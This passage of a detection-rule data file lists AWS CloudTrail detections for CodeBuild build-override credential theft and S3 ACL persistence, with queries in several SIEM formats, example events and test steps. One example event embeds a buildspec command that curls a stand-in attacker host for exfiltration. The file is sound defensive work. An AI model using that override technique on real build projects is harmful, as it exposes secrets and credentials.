  AND p.use_time > r.recon_time
  AND p.use_time <= r.recon_time + INTERVAL '30' MINUTE
ORDER BY r.recon_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.applicationName
| filter (eventSource = "elasticbeanstalk.amazonaws.com" and eventName = "DescribeConfigurationSettings")
  or eventName in ["CreateAccessKey", "AssumeRole", "GetSecretValue", "Decrypt"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.elasticbeanstalk"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["elasticbeanstalk.amazonaws.com"], eventName: ["DescribeConfigurationSettings"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "elasticbeanstalk.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.applicationName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "elasticbeanstalk.amazonaws.com", eventName: "DescribeConfigurationSettings", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { applicationName: "my-app", environmentName: "prod" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify DescribeConfigurationSettings and privileged use sequence.", "Verify if follow-on activity indicates credential theft.", "Check env config for exposed secrets."],
    testingSteps: ["Call DescribeConfigurationSettings, then GetSecretValue within 30 min.", "Run Splunk or Athena correlation query."],
  },

  // --- CodeBuild Environment Credential Theft ---
  {
    id: "det-126",
    title: "CodeBuild StartBuild Visibility",
    description: "Baseline visibility for build execution. Builds are normal, but StartBuild is a key entry point for abuse if an attacker can inject or override execution behavior.",
    awsService: "CodeBuild",
    relatedServices: ["IAM"],
    severity: "Medium",
    tags: ["CodeBuild", "Credential Theft"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate CI/CD builds", "Deployment pipelines"],
    rules: {
      sigma: `title: CodeBuild StartBuild Visibility
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: codebuild.amazonaws.com
    eventName: StartBuild
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=codebuild.amazonaws.com eventName=StartBuild
| table _time, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.projectName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.projectName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'codebuild.amazonaws.com'
  AND eventName = 'StartBuild'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.projectName, sourceIPAddress
| filter eventSource = "codebuild.amazonaws.com"
| filter eventName = "StartBuild"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.projectName", "requestParameters.buildspecOverride", "requestParameters.environmentVariablesOverride", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { projectName: "my-project" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and project.", "Verify if build was authorized.", "Check for buildspecOverride or environmentVariablesOverride."],
    testingSteps: ["Call StartBuild.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-127",
    title: "StartBuild with Dangerous Overrides",
    description: "Detects likely malicious manipulation of the build execution path. buildspecOverride and environmentVariablesOverride are unusually powerful and security-sensitive because they can change build commands and variable handling.",
    awsService: "CodeBuild",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["CodeBuild", "Credential Theft", "Build Override"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate build override for testing", "Dynamic buildspec"],
    rules: {
      sigma: `title: StartBuild with Dangerous Overrides
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: codebuild.amazonaws.com
    eventName: StartBuild
  filter_buildspec:
    requestParameters.buildspecOverride|exists: true
  filter_envvars:
    requestParameters.environmentVariablesOverride|exists: true
  condition: selection and (filter_buildspec or filter_envvars)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=codebuild.amazonaws.com eventName=StartBuild
| where isnotnull(requestParameters.buildspecOverride) OR isnotnull(requestParameters.environmentVariablesOverride)
| table _time, userIdentity.arn, eventName, requestParameters.projectName, requestParameters.buildspecOverride, requestParameters.environmentVariablesOverride, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.projectName, requestParameters.buildspecOverride, requestParameters.environmentVariablesOverride, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'codebuild.amazonaws.com'
  AND eventName = 'StartBuild'
  AND (requestParameters.buildspecOverride IS NOT NULL OR requestParameters.environmentVariablesOverride IS NOT NULL)
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.projectName, requestParameters.buildspecOverride, requestParameters.environmentVariablesOverride
| filter eventSource = "codebuild.amazonaws.com"
| filter eventName = "StartBuild"
| filter ispresent(requestParameters.buildspecOverride) or ispresent(requestParameters.environmentVariablesOverride)
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.projectName", "requestParameters.buildspecOverride", "requestParameters.environmentVariablesOverride", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { projectName: "target", buildspecOverride: "version: 0.2\nphases:\n  build:\n    commands:\n      - curl http://attacker.com/exfil" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and override content.", "Verify if override was authorized.", "Check for follow-on credential access by build role."],
    testingSteps: ["StartBuild with buildspecOverride or environmentVariablesOverride.", "Verify detection triggers."],
  },
  {
    id: "det-128",
    title: "StartBuild by Unexpected Actor",
    description: "Detects build execution initiated by identities that normally should not trigger builds or touch buildspec behavior. Suspicious: IAM users outside CI/CD engineering, application roles, unusual assumed roles.",
    awsService: "CodeBuild",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["CodeBuild", "Credential Theft", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known CI/CD roles", "Codepipeline", "CodeBuild service"],
    rules: {
      sigma: `title: StartBuild by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: codebuild.amazonaws.com
    eventName: StartBuild
  filter_known:
    userIdentity.arn|contains:
      - 'codepipeline'
      - 'codebuild'
      - '/role/CI'
      - '/role/DevOps'
      - '/role/Platform'
  condition: selection and not filter_known
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=codebuild.amazonaws.com eventName=StartBuild
| where NOT (like(userIdentity.arn, "%codepipeline%") OR like(userIdentity.arn, "%codebuild%") OR like(userIdentity.arn, "%/role/CI%") OR like(userIdentity.arn, "%/role/DevOps%") OR like(userIdentity.arn, "%/role/Platform%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.projectName, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.projectName, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'codebuild.amazonaws.com'
  AND eventName = 'StartBuild'
  AND userIdentity.arn NOT LIKE '%codepipeline%'
  AND userIdentity.arn NOT LIKE '%codebuild%'
  AND userIdentity.arn NOT LIKE '%/role/CI%'
  AND userIdentity.arn NOT LIKE '%/role/DevOps%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.projectName
| filter eventSource = "codebuild.amazonaws.com"
| filter eventName = "StartBuild"
| filter userIdentity.arn not like /codepipeline|codebuild|\\/role\\/(CI|DevOps|Platform)/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.projectName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { projectName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for CodeBuild.", "Update allowlist if legitimate."],
    testingSteps: ["As non-CI role, call StartBuild.", "Verify detection triggers."],
  },
  {
    id: "det-129",
    title: "StartBuild with Overrides Followed by Sensitive IAM or Secrets Activity",
    description: "High-confidence credential-theft: StartBuild with buildspecOverride and/or environmentVariablesOverride then shortly afterward CodeBuild service role or actor performs GetSecretValue, CreateAccessKey, AssumeRole, KMS Decrypt, or broad S3 access.",
    awsService: "CodeBuild",
    relatedServices: ["IAM", "STS", "Secrets Manager", "KMS", "S3"],
    severity: "Critical",
    tags: ["CodeBuild", "Credential Theft", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate build using secrets", "Expected workload"],
    rules: {
      sigma: `title: StartBuild with Overrides Followed by Sensitive Activity
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_start:
    eventSource: codebuild.amazonaws.com
    eventName: StartBuild
  selection_sensitive:
    eventName:
      - GetSecretValue
      - CreateAccessKey
      - AssumeRole
      - Decrypt
  condition: 1 of selection_*
level: critical
# Full correlation (actor/build-role, 30 min) requires SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail
  ((eventSource=codebuild.amazonaws.com AND eventName=StartBuild) OR (eventName=GetSecretValue OR eventName=CreateAccessKey OR eventName=AssumeRole OR eventName=Decrypt))
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval is_start=if(eventSource="codebuild.amazonaws.com" AND eventName="StartBuild", 1, 0)
| eval is_sensitive=if(eventName IN ("GetSecretValue","CreateAccessKey","AssumeRole","Decrypt"), 1, 0)
| transaction actor maxspan=30m
| where mvcount(mvfilter(is_start=1))>0 AND mvcount(mvfilter(is_sensitive=1))>0
| table _time, actor, eventName, requestParameters.projectName`,
      cloudtrail: `WITH start_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS start_time
  FROM cloudtrail_logs
  WHERE eventSource = 'codebuild.amazonaws.com'
    AND eventName = 'StartBuild'
    AND (requestParameters.buildspecOverride IS NOT NULL OR requestParameters.environmentVariablesOverride IS NOT NULL)
),
sensitive_evt AS (
  SELECT userIdentity.arn AS actor, eventTime AS use_time, eventName
  FROM cloudtrail_logs
  WHERE eventName IN ('GetSecretValue', 'CreateAccessKey', 'AssumeRole', 'Decrypt')
)
SELECT s.actor, s.start_time, e.use_time, e.eventName
FROM start_evt s
JOIN sensitive_evt e ON s.actor = e.actor
  AND e.use_time > s.start_time
  AND e.use_time <= s.start_time + INTERVAL '30' MINUTE
ORDER BY s.start_time DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, eventSource, requestParameters.projectName
| filter (eventSource = "codebuild.amazonaws.com" and eventName = "StartBuild")
  or eventName in ["GetSecretValue", "CreateAccessKey", "AssumeRole", "Decrypt"]
| stats count(*) as cnt, collect_list(eventName) as events by userIdentity.arn
| filter cnt > 1
| sort cnt desc`,
      eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.projectName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { projectName: "target", buildspecOverride: "malicious" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify StartBuild and sensitive API sequence.", "Verify if build role performed expected vs malicious API calls.", "Check buildspecOverride content."],
    testingSteps: ["StartBuild with override, then have build role call GetSecretValue.", "Run Splunk or Athena correlation query."],
  },
  {
    id: "det-130",
    title: "Rare or New Project Used for Build Trigger",
    description: "Detects suspicious use of seldom-used or newly targeted projects. Attackers often pick a build project that already has privileged environment access but is not heavily monitored.",
    awsService: "CodeBuild",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["CodeBuild", "Credential Theft", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate use of dormant project", "New project in pipeline"],
    rules: {
      sigma: `title: Rare or New Project Used for Build Trigger
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: codebuild.amazonaws.com
    eventName: StartBuild
  condition: selection
level: high
# Requires baseline: projectName not seen in last N days for this actor. Implement in SIEM.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=codebuild.amazonaws.com eventName=StartBuild
| eval actor=coalesce(userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn)
| eval project=requestParameters.projectName
| lookup project_actor_baseline actor,project OUTPUT first_seen
| where isnull(first_seen) OR first_seen > relative_time(now(), "-7d")
| table _time, actor, project, first_seen`,
      cloudtrail: `-- Requires baseline table of (actor, projectName) first-seen dates
SELECT eventTime, userIdentity.arn AS actor, requestParameters.projectName AS project, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'codebuild.amazonaws.com'
  AND eventName = 'StartBuild'
ORDER BY eventTime DESC
-- Enrich: flag if (actor, project) is new or rare (e.g., not in baseline from last 30 days)`,
      cloudwatch: `fields @timestamp, userIdentity.arn, requestParameters.projectName, sourceIPAddress
| filter eventSource = "codebuild.amazonaws.com"
| filter eventName = "StartBuild"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.codebuild"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["codebuild.amazonaws.com"], eventName: ["StartBuild"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "codebuild.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.projectName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "codebuild.amazonaws.com", eventName: "StartBuild", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { projectName: "dormant-project" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the project and actor.", "Verify if project use was expected.", "Build baseline of (actor, project) for anomaly detection."],
    testingSteps: ["StartBuild on a project the actor has not used recently.", "Verify detection with baseline."],
  },

  // --- S3 ACL Persistence ---
  {
    id: "det-131",
    title: "S3 ACL Changed",
    description: "Baseline visibility for any bucket or object ACL modification. ACL changes are sensitive, though not always malicious in legacy environments.",
    awsService: "S3",
    relatedServices: [],
    severity: "Medium",
    tags: ["S3", "ACL", "Persistence"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate ACL management", "Legacy bucket config"],
    rules: {
      sigma: `title: S3 ACL Changed
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName:
      - PutBucketAcl
      - PutObjectAcl
  condition: selection
level: medium`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=PutBucketAcl OR eventName=PutObjectAcl)
| table _time, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl, requestParameters.AccessControlPolicy, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl, requestParameters.AccessControlPolicy, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND eventName IN ('PutBucketAcl', 'PutObjectAcl')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl, sourceIPAddress
| filter eventSource = "s3.amazonaws.com"
| filter eventName in ["PutBucketAcl", "PutObjectAcl"]
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.key", "requestParameters.acl", "requestParameters.AccessControlPolicy", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/admin" }, requestParameters: { bucketName: "my-bucket" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor and target bucket/object.", "Verify if ACL change was authorized.", "Check for cross-account or broad grants."],
    testingSteps: ["Call PutBucketAcl or PutObjectAcl.", "Verify CloudTrail captures the event.", "Run the detection."],
  },
  {
    id: "det-132",
    title: "ACL Changed on Bucket with ACLs Enabled",
    description: "Detects meaningful ACL persistence in environments where ACLs are still active. Successful PutBucketAcl/PutObjectAcl are only materially effective when ACLs are not disabled by BucketOwnerEnforced.",
    awsService: "S3",
    relatedServices: [],
    severity: "High",
    tags: ["S3", "ACL", "Persistence"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legacy ACL-enabled bucket management"],
    rules: {
      sigma: `title: ACL Changed on ACL-Enabled Bucket
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName:
      - PutBucketAcl
      - PutObjectAcl
  filter_error:
    errorCode|exists: true
  condition: selection and not filter_error
level: high
# Enrich: exclude buckets with ObjectOwnership=BucketOwnerEnforced if available.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=PutBucketAcl OR eventName=PutObjectAcl)
| where isnull(errorCode) OR errorCode=""
| table _time, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND eventName IN ('PutBucketAcl', 'PutObjectAcl')
  AND (errorCode IS NULL OR errorCode = '')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl
| filter eventSource = "s3.amazonaws.com"
| filter eventName in ["PutBucketAcl", "PutObjectAcl"]
| filter not ispresent(errorCode) or errorCode = ""
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.acl", "errorCode", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { bucketName: "legacy-bucket", acl: "public-read" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the bucket and ACL change.", "Verify if bucket has ACLs enabled (not BucketOwnerEnforced).", "Check for cross-account or public grants."],
    testingSteps: ["PutBucketAcl on ACL-enabled bucket.", "Verify detection triggers."],
  },
  {
    id: "det-133",
    title: "Cross-Account or Broad ACL Grant",
    description: "Detects likely persistence or unauthorized sharing when ACL changes grant another AWS account or broad access. Flag cross-account grants, public-style grants (public-read, public-read-write), or full-control grants to unexpected principals.",
    awsService: "S3",
    relatedServices: [],
    severity: "Critical",
    tags: ["S3", "ACL", "Persistence", "Cross-Account"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Authorized cross-account sharing", "Legacy public bucket"],
    rules: {
      sigma: `title: Cross-Account or Broad ACL Grant
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName:
      - PutBucketAcl
      - PutObjectAcl
  filter_public:
    requestParameters.acl|contains:
      - 'public-read'
      - 'public-read-write'
      - 'authenticated-read'
  filter_grant:
    requestParameters.AccessControlPolicy|contains:
      - 'Grant'
      - 'Grantee'
  condition: selection and (filter_public or filter_grant)
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=PutBucketAcl OR eventName=PutObjectAcl)
| where like(requestParameters.acl, "%public%") OR like(requestParameters.acl, "%authenticated%") OR like(requestParameters.AccessControlPolicy, "%Grant%") OR like(requestParameters.AccessControlPolicy, "%Grantee%")
| table _time, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl, requestParameters.AccessControlPolicy, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl, requestParameters.AccessControlPolicy, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND eventName IN ('PutBucketAcl', 'PutObjectAcl')
  AND (requestParameters.acl LIKE '%public%' OR requestParameters.acl LIKE '%authenticated%' OR requestParameters.AccessControlPolicy LIKE '%Grant%' OR requestParameters.AccessControlPolicy LIKE '%Grantee%')
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.arn, eventName, requestParameters.bucketName, requestParameters.key, requestParameters.acl, requestParameters.AccessControlPolicy
| filter eventSource = "s3.amazonaws.com"
| filter eventName in ["PutBucketAcl", "PutObjectAcl"]
| filter requestParameters.acl like /public|authenticated/ or requestParameters.AccessControlPolicy like /Grant|Grantee/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.arn", "requestParameters.bucketName", "requestParameters.acl", "requestParameters.AccessControlPolicy", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev" }, requestParameters: { bucketName: "target", acl: "public-read" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the ACL grant details.", "Verify if cross-account or public grant was authorized.", "Check recipient account IDs in AccessControlPolicy."],
    testingSteps: ["PutBucketAcl with public-read or cross-account grant.", "Verify detection triggers."],
  },
  {
    id: "det-134",
    title: "ACL Persistence by Unexpected Actor",
    description: "Detects ACL changes by identities that normally should not manage bucket/object sharing. Suspicious: IAM users outside storage/platform admin, application roles, unusual assumed roles.",
    awsService: "S3",
    relatedServices: [],
    severity: "High",
    tags: ["S3", "ACL", "Anomaly"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Known storage/platform admin", "Terraform/CloudFormation"],
    rules: {
      sigma: `title: ACL Persistence by Unexpected Actor
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: s3.amazonaws.com
    eventName:
      - PutBucketAcl
      - PutObjectAcl
  filter_arn:
    userIdentity.arn|contains:
      - '/role/Storage'
      - '/role/Platform'
      - '/role/Admin'
  filter_automation:
    userIdentity.principalId|contains:
      - 'terraform'
      - 'cloudformation'
  condition: selection and not (filter_arn or filter_automation)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=PutBucketAcl OR eventName=PutObjectAcl)
| where NOT (like(userIdentity.arn, "%/role/Storage%") OR like(userIdentity.arn, "%/role/Platform%") OR like(userIdentity.arn, "%/role/Admin%") OR like(userIdentity.principalId, "%terraform%") OR like(userIdentity.principalId, "%cloudformation%"))
| table _time, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.bucketName, requestParameters.key, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.bucketName, requestParameters.key, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 's3.amazonaws.com'
  AND eventName IN ('PutBucketAcl', 'PutObjectAcl')
  AND userIdentity.arn NOT LIKE '%/role/Storage%'
  AND userIdentity.arn NOT LIKE '%/role/Platform%'
  AND userIdentity.arn NOT LIKE '%/role/Admin%'
  AND (userIdentity.principalId IS NULL OR (userIdentity.principalId NOT LIKE '%terraform%' AND userIdentity.principalId NOT LIKE '%cloudformation%'))
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, userIdentity.sessionContext.sessionIssuer.arn, eventName, requestParameters.bucketName, requestParameters.key
| filter eventSource = "s3.amazonaws.com"
| filter eventName in ["PutBucketAcl", "PutObjectAcl"]
| filter userIdentity.arn not like /\\/role\\/(Storage|Platform|Admin)/ and userIdentity.principalId not like /terraform|cloudformation/
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.s3"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["s3.amazonaws.com"], eventName: ["PutBucketAcl", "PutObjectAcl"] } }, null, 2),
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "s3.amazonaws.com", importantFields: ["eventSource", "eventName", "userIdentity.type", "userIdentity.arn", "requestParameters.bucketName", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "s3.amazonaws.com", eventName: "PutBucketAcl", userIdentity: { type: "AssumedRole", arn: "arn:aws:sts::123456789012:assumed-role/AppRole/session" }, requestParameters: { bucketName: "target" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify the actor type and ARN.", "Verify if this identity is authorized for S3 ACL management.", "Update allowlist if legitimate."],
    testingSteps: ["As non-storage role, call PutBucketAcl.", "Verify detection triggers."],
  },
  {
    id: "det-135",
    title: "ACL Change Followed by Access from Granted Principal",
    description: "High-confidence persistence: PutBucketAcl/PutObjectAcl granting access then subsequent S3 access by the granted principal or external-account-style usage pattern.",
    awsService: "S3",
    relatedServices: [],
    severity: "Critical",
    tags: ["S3", "ACL", "Behavior Correlation"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Legitimate ACL then expected access"],
    rules: {
      sigma: `title: ACL Change Followed by Access from Granted Principal
status: experimental
logsource:
  service: cloudtrail
detection:
  selection_acl:
    eventSource: s3.amazonaws.com
    eventName:
      - PutBucketAcl
      - PutObjectAcl
  selection_access:
    eventSource: s3.amazonaws.com
    eventName:
      - GetObject
      - ListBucket
      - PutObject
  condition: 1 of selection_*
level: critical
# Full correlation (bucket + granted principal, 1h) requires SIEM. Match ACL grantee to access actor.`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=s3.amazonaws.com (eventName=PutBucketAcl OR eventName=PutObjectAcl OR eventName=GetObject OR eventName=ListBucket OR eventName=PutObject)
| eval bucket=requestParameters.bucketName
| eval actor=coalesce(userIdentity.arn, userIdentity.accountId)
| eval is_acl=if(eventName IN ("PutBucketAcl","PutObjectAcl"), 1, 0)
